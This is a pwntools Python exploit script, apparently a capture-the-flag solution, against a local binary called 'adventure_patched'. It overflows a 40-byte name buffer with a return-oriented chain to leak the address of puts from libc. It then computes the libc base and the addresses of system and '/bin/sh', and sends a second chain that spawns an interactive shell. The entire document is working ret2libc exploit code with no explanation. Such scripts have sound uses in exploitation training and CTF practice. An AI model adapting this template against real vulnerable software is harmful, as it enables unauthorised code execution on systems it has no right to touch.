#!/usr/bin/env python3

from pwn import *

p=process('./adventure_patched')


gdb.attach(p,gdbscript='''
b* 0x0000000000401267
b* 0x401297
c
    ''')
exe = ELF("./adventure_patched",checksec =False)
libc = ELF("./libc.so.6",checksec=False)
ld = ELF("./ld-2.35.so",checksec=False)

pop_rdi = 0x000000000040121e
ret = 0x000000000040180a

p.sendlineafter(b'Enter your choice: ',b'2')
p.sendlineafter(b'2. No\n',b'1')
p.sendlineafter(b'name\n',b'a'*40 + p64(pop_rdi) + p64(exe.got['puts']) +p64(exe.plt['puts'])+p64(exe.sym['main'])) 

p.recvuntil(b'You leave the area with')
p.recvline()

leak = p.recvline()[:-1]
leak = u64(leak.ljust(8,b'\x00'))
print("LIBC_LEAK: " + hex(leak))

libc_base = leak - 0x80ed0
system = libc_base +  0x50d60
print("LIBc_BASE: " + hex(libc_base))
bin_sh = libc_base + 0x1d8698
print("BIN_SH: " + hex(bin_sh))

p.sendlineafter(b'Enter your choice: ',b'2')
p.sendlineafter(b'2. No\n',b'1')
p.sendlineafter(b'name\n',b'b'*40 +p64(pop_rdi) + p64(bin_sh) + p64(pop_rdi + 1) + p64(system))

p.interactive()